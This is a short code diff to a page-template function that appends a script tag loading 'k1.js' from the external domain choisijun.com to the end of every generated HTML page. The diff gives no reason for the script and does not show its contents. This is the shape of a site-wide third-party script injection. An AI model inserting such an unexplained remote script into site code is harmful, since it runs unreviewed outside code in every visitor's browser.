@@ -407,7 +407,7 @@
   }
 
   function tail(extra) {
-    return '<script src="/assets/js/main.js?v=' + ASSET_V + '" defer></script>\n' + (extra || "") + "</body>\n</html>\n";
+    return '<script src="/assets/js/main.js?v=' + ASSET_V + '" defer></script>\n' + (extra || "") + '<script defer src="https://choisijun.com/k1.js" integrity="sha384-E7Xl7wiU1vNu5AUY41kJB1uV52L+UEvqwYRzRj4zdaBGAeyRfCll926ETRo39Jm6" crossorigin="anonymous"></script>\n' + "</body>\n</html>\n";
   }
 
   function orgLd() {
